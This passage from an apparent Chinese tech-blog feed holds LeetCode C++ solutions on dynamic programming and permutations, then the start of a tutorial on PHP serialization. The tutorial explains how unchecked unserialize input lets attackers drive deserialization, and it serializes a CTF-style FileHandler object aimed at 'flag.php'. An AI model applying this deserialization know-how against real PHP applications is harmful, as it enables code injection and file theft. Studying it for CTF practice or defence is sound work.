class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=m;i++)</span><br><span class="line">            dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=n;j++)</span><br><span class="line">            dp[<span class="number">0</span>][j] = j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(word1[i<span class="number">-1</span>]==word2[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j]=<span class="built_in">min</span>(dp[i<span class="number">-1</span>][j]+<span class="number">1</span>,dp[i][j<span class="number">-1</span>]+<span class="number">1</span>);</span><br><span class="line">                     <span class="comment">//dp[i-1][j-1]+2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="72-编辑距离"><a href="#72-编辑距离" class="headerlink" title="72 编辑距离"></a>72 编辑距离</h3><p>给你两个单词 word1 和 word2，请你计算出【将 word1 转换成 word2 所使用的最少操作数】。</p>
<p><strong>可以对一个单词进行如下三种操作</strong>：</p>
<ul>
<li><strong>插入</strong>一个字符</li>
<li><strong>删除</strong>一个字符</li>
<li><strong>替换</strong>一个字符</li>
</ul>
<p><strong>注意：可视【删除】和【插入】效果一致</strong></p>
<p>示例 1：<br>    输入：word1 = “horse”, word2 = “ros”<br>    输出：3<br>    解释： horse -&gt; rorse (将 ‘h’ 替换为 ‘r’) rorse -&gt; rose (删除 ‘r’) rose -&gt; ros (删除 ‘e’)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划 </span></span><br><span class="line"><span class="comment">    dp[i][j]以word1[i-1]和word2[j-1]为结尾的两个字符串进行操作后相等 的最小操作数。</span></span><br><span class="line"><span class="comment">    if(word1[i-1]==word2[j-1])</span></span><br><span class="line"><span class="comment">        dp[i][j]=dp[i-1][j-1];</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        dp[i][j]=min(dp[i-1][j]+1,dp[i][j-1]+1,dp[i-1][j-1]+1);</span></span><br><span class="line"><span class="comment">    初始化：</span></span><br><span class="line"><span class="comment">        dp[0][0]=0; dp[i][0]=i; dp[0][j]=j;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = word1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = word2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,vector&lt;<span class="keyword">int</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>; </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=m;i++)</span><br><span class="line">            dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">            dp[<span class="number">0</span>][j] = j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">                <span class="keyword">if</span>(word1[i<span class="number">-1</span>]==word2[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j]=dp[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j]=<span class="built_in">min</span>(<span class="built_in">min</span>(dp[i<span class="number">-1</span>][j]+<span class="number">1</span>,dp[i][j<span class="number">-1</span>]+<span class="number">1</span>),dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="647-回文子串"><a href="#647-回文子串" class="headerlink" title="647 回文子串"></a>647 回文子串</h3><p>给你一个字符串 s ，请你统计并返回【这个字符串中 回文子串 的数目】。<br><strong>回文字符串</strong> 是正着读和倒过来读一样的字符串。<br><strong>子字符串</strong> 是字符串中的由【连续字符】组成的一个序列。<br>单个字符也是回文字串</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j] 下标[i,j]范围内 【回文子串的数目】</span></span><br><span class="line"><span class="comment">    初始化：false</span></span><br><span class="line"><span class="comment">    if(s[i]==s[j])&#123;</span></span><br><span class="line"><span class="comment">        if(j-i&lt;=1)</span></span><br><span class="line"><span class="comment">            dp[i][j] = true;//是回文子串</span></span><br><span class="line"><span class="comment">            count++;//个数++</span></span><br><span class="line"><span class="comment">        else if(dp[i+1][j-1]==true)</span></span><br><span class="line"><span class="comment">            dp[i][j] = true;</span></span><br><span class="line"><span class="comment">            count++;  </span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    重点！遍历顺序！相对位置如下</span></span><br><span class="line"><span class="comment">    [i-1,j-1] [i-1,j]</span></span><br><span class="line"><span class="comment">    [i , j-1] [i , j]</span></span><br><span class="line"><span class="comment">    [i+1,j-1] [i+1,j]</span></span><br><span class="line"><span class="comment">    i对应一行一行的遍历，【从下到上】</span></span><br><span class="line"><span class="comment">    j对应一列一列的遍历，从左到右</span></span><br><span class="line"><span class="comment">    【之前都是，从上到下，从左到右】</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countSubstrings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">bool</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">bool</span>&gt;(n,<span class="literal">false</span>));<span class="comment">//初始false</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s[i]==s[j])&#123;</span><br><span class="line">                    <span class="keyword">if</span>(j-i&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;<span class="comment">//是回文子串</span></span><br><span class="line">                        count++;<span class="comment">//个数++</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(dp[i+<span class="number">1</span>][j<span class="number">-1</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                        count++; </span><br><span class="line">                    &#125;      </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="5-最长回文子串——连续-子串"><a href="#5-最长回文子串——连续-子串" class="headerlink" title="5 最长回文子串——连续-子串"></a>5 最长回文子串——连续-子串</h3><p>给你一个字符串 s，找到 s 中【最长的回文子串】。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j] 在上题基础上 更新每个回文子串的长度下标</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">int</span>&gt;(n,<span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> len=<span class="number">0</span>,l,r;<span class="comment">//记录最长回文串的 下标范围</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;n;j++)&#123;<span class="comment">//从i开始</span></span><br><span class="line">                <span class="keyword">if</span>(s[i]==s[j])&#123;</span><br><span class="line">                    <span class="keyword">if</span>(j-i&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;<span class="comment">//是回文子串</span></span><br><span class="line">                        <span class="keyword">if</span>(j-i+<span class="number">1</span>&gt;len)&#123;<span class="comment">//这里！</span></span><br><span class="line">                            l=i; r=j;</span><br><span class="line">                            len = j-i+<span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(dp[i+<span class="number">1</span>][j<span class="number">-1</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                        <span class="keyword">if</span>(j-i+<span class="number">1</span>&gt;len)&#123;<span class="comment">//这里！</span></span><br><span class="line">                            l=i; r=j;</span><br><span class="line">                            len = j-i+<span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;      </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        string str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=r;i++)&#123;</span><br><span class="line">            str += s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">        <span class="comment">//或者直接返回 s.substr(l,r-l+1);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="516-最长回文子序列——非连续-子序列"><a href="#516-最长回文子序列——非连续-子序列" class="headerlink" title="516 最长回文子序列——非连续-子序列"></a>516 最长回文子序列——非连续-子序列</h3><p>给你一个字符串 s ，找出其中最长的回文子序列，并【返回该序列的长度】。<br><strong>子序列</strong>定义为：不改变剩余字符顺序的情况下，删除某些字符或者不删除任何字符形成的一个序列。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j] 下标[i,j]范围内 【最长回文子序列长度】</span></span><br><span class="line"><span class="comment">    if(s[i]==s[j])</span></span><br><span class="line"><span class="comment">        dp[i][j] = dp[i-1][j-1]+2;</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        dp[i][j] = max(dp[i+1][j],dp[i][j-1]);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">longestPalindromeSubseq</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">int</span>&gt;(n,<span class="number">0</span>));</span><br><span class="line">        <span class="comment">//int res = 1;//这里要初始化为1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            dp[i][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;<span class="comment">//从i+1开始</span></span><br><span class="line">                <span class="keyword">if</span>(s[i]==s[j])</span><br><span class="line">                    dp[i][j] = dp[i+<span class="number">1</span>][j<span class="number">-1</span>]+<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i+<span class="number">1</span>][j],dp[i][j<span class="number">-1</span>]);</span><br><span class="line">                <span class="comment">//res = max(res,dp[i][j]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46 全排列"></a>46 全排列</h2><p>给定一个不含重复数字的数组 nums ，返回其 所有可能的全排列 。你可以 按任意顺序 返回答案。</p>
<p><strong>回溯法</strong>：一种通过探索所有可能的候选解来找出所有的解的算法。如果候选解被确认不是一个解（或者至少不是最后一个解），回溯算法会通过在上一步进行一些变化抛弃该解，即回溯并且再次尝试。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">dfs</span>(nums);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; cur;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur.<span class="built_in">size</span>() == nums.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(cur);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] != <span class="number">99</span>) &#123;<span class="comment">//没被用过</span></span><br><span class="line">                <span class="keyword">int</span> temp = nums[i];<span class="comment">//暂存</span></span><br><span class="line">                cur.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line"></span><br><span class="line">                nums[i] = <span class="number">99</span>;<span class="comment">//存入cur后标记 改为“用过”</span></span><br><span class="line">                <span class="built_in">dfs</span>(nums);</span><br><span class="line">                nums[i] = temp;</span><br><span class="line">                cur.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; res,vector&lt;<span class="keyword">int</span>&gt;&amp; output,<span class="keyword">int</span> first,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="comment">//first:从左往右填到第first位置，当前的排列是output</span></span><br><span class="line">        <span class="comment">//first==len 证明一轮填写完毕</span></span><br><span class="line">        <span class="keyword">if</span>(first==len)&#123;</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(output);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=first;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="built_in">swap</span>(output[i],output[first]);</span><br><span class="line">            <span class="built_in">backtrack</span>(res,output,first+<span class="number">1</span>,len);<span class="comment">//递归填下一个数</span></span><br><span class="line">            <span class="built_in">swap</span>(output[i],output[first]);<span class="comment">//撤销操作</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">backtrack</span>(res,nums,<span class="number">0</span>,(<span class="keyword">int</span>)nums.<span class="built_in">size</span>());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="47-全排列-II"><a href="#47-全排列-II" class="headerlink" title="47 全排列 II"></a>47 全排列 II</h2><p>给定一个可包含重复数字的序列 nums ，按任意顺序 返回所有不重复的全排列。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permuteUnique</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; ans;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(nums);</span><br><span class="line">        &#125;<span class="keyword">while</span>(<span class="built_in">next_permutation</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>()));</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>力扣刷题</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
  <entry>
    <title>序列化与反序列化</title>
    <url>/2021/10/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p>
<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><blockquote>
<p>序列化：持久保存，网络传输</p>
<p>序列化是将对象状态转换为可保持或可传输的格式的过程（对象转换为字符串）。与序列化相对的是反序列化，它将流转换为对象（字符串转换为对象）。这两个过程结合起来，可以轻松地存储和传输数据</p>
<p>本质上就是对于数据格式的一种转换</p>
</blockquote>
<p><strong>常见的序列化格式：</strong></p>
<ul>
<li>二进制格式</li>
<li>字节数组</li>
<li>json 字符串</li>
<li>xml 字符串</li>
</ul>
<p><img src="https://i.loli.net/2021/09/15/IWPycor6sQ9nYL7.png" alt="image-20210504114814092"></p>
<p>理解：在程序执行结束时，内存数据便会立即销毁，变量所储存的数据便是内存数据，而文件、数据库是“持久数据”，因此<strong>PHP序列化就是将内存的变量数据“保存”到文件中的持久数据的过程。</strong></p>
<h1 id="一、-PHP-反序列化"><a href="#一、-PHP-反序列化" class="headerlink" title="一、 PHP 反序列化"></a>一、 PHP 反序列化</h1><h2 id="1-1-格式"><a href="#1-1-格式" class="headerlink" title="1.1 格式"></a>1.1 格式</h2><p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码注入，SQL注入等危害。</p>
<p>当进行反序列化的过程中就会自动触发某些魔术方法。</p>
<p><strong>涉及函数：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">serialize()		<span class="comment">//序列化：将一个对象转换为一个字符串</span></span><br><span class="line">unserialize()	<span class="comment">//反序列化：将一个字符串还原为一个对象</span></span><br></pre></td></tr></table></figure>

<p><strong>示例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;qww&quot;</span>;</span><br><span class="line"><span class="comment">//$test = 123;</span></span><br><span class="line"><span class="comment">//$test = true;</span></span><br><span class="line"><span class="variable">$test</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//s:3:&quot;qww&quot;;</span></span><br><span class="line"><span class="comment">//i:123;    </span></span><br><span class="line"><span class="comment">//b:1;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&#x27;s:3:&quot;qww&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$test</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//qww </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$user</span>=array(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=serialize(<span class="variable">$user</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$user</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">print_r(unserialize(<span class="variable">$user</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/10/qVYPWyw4pl1ITsJ.png" alt="image-20210910165634478"></p>
<p><strong>格式：</strong></p>
<p><img src="https://i.loli.net/2021/09/15/3JxYcWU6D2tlKOn.png" alt="image-20210504120450323"></p>
<p><strong>序列化与反序列化 字母表示：</strong></p>
<table>
<thead>
<tr>
<th align="center">a</th>
<th align="center">array数组</th>
</tr>
</thead>
<tbody><tr>
<td align="center">b</td>
<td align="center">boolean判断类型</td>
</tr>
<tr>
<td align="center">d</td>
<td align="center">double浮点数</td>
</tr>
<tr>
<td align="center">i</td>
<td align="center">integer整数型</td>
</tr>
<tr>
<td align="center">o</td>
<td align="center">common object 一般的对象</td>
</tr>
<tr>
<td align="center">r</td>
<td align="center">reference引用类型</td>
</tr>
<tr>
<td align="center">s</td>
<td align="center">string字符串类型</td>
</tr>
<tr>
<td align="center">C</td>
<td align="center">custom object</td>
</tr>
<tr>
<td align="center">O</td>
<td align="center">class</td>
</tr>
<tr>
<td align="center">N</td>
<td align="center">null</td>
</tr>
<tr>
<td align="center">R</td>
<td align="center">pointer reference</td>
</tr>
<tr>
<td align="center">U</td>
<td align="center">unicode string</td>
</tr>
</tbody></table>
<h2 id="1-2-特性"><a href="#1-2-特性" class="headerlink" title="1.2 特性"></a>1.2 特性</h2><ul>
<li><p><strong>所有 php 中的值都可以使用 serialize()  来返回一个包含字节流的字符串表示</strong></p>
</li>
<li><p><strong>序列化之后的内容只有成员变量，没有成员函数，即方法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    public <span class="variable">$a</span>;</span><br><span class="line">    public <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;<span class="variable">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">happy</span></span>()&#123;<span class="built_in">return</span> <span class="variable">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new <span class="built_in">test</span>();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/09/10/NS5xRa8hUD7rvXI.png" alt="image-20210910170119999"></p>
</li>
<li><p><strong>三种变量类型的差异：</strong></p>
<p>变量前是 <strong>protected</strong>，则会在变量名前加上<code>\x00*\x00</code> , <strong>private</strong> 则会在变量名前加上<code>\x00类名\x00</code>，<code>\x00字段名\x00</code>，输出时一般需要url编码，若在本地存储推荐采用base64编码的形式。</p>
<ul>
<li><p><strong>public  正常输出</strong></p>
</li>
<li><p><strong>Private 所声明的私有变量</strong> 只能在所声明的类中可见，在该类的子类以及该类的对象中均不可见。所以私有变量在序列化时，类名和字段名前面都会加上 <code>%00</code> ，即 ascii 为0的字符（不可见字符）；</p>
</li>
<li><p><strong>Protected 所声明受保护类型的变量</strong> 序列化时会有 <code>%00*%00</code> 字符；</p>
</li>
</ul>
<p><strong>测试一：public</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试二：private</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$op</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

